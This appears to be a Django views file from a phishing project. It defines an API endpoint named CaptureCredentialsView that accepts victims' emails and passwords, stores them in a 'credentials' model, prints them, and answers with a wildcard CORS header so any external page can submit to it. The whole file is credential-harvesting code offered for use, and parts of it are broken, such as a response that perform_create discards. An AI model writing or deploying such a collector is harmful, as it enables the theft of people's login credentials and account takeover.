from django.shortcuts import render, redirect
from django.http import HttpResponse
from .forms import credentials_capturer
from django.http import HttpResponseRedirect
from django.views.decorators.csrf import csrf_exempt
import urllib.parse
import smtplib
from django.conf import settings
from django.core.mail import send_mail
from django.http import JsonResponse
import testing_api
from django.views.decorators.clickjacking import xframe_options_exempt
from bs4 import BeautifulSoup
import json
import datetime
from rest_framework import generics
from .models import credentials
from .serializers import CredentialsCapturerSerializer

class CaptureCredentialsView(generics.CreateAPIView):
    queryset = credentials.objects.all()
    serializer_class = CredentialsCapturerSerializer
    
    def perform_create(self, serializer):
        email = serializer.validated_data['email']
        password = serializer.validated_data['password']
        serializer.save()
        
        data = {'email': email, 'password': password}
        response = JsonResponse(data)
        print(response)
        response['Access-Control-Allow-Origin'] = '*'
        return response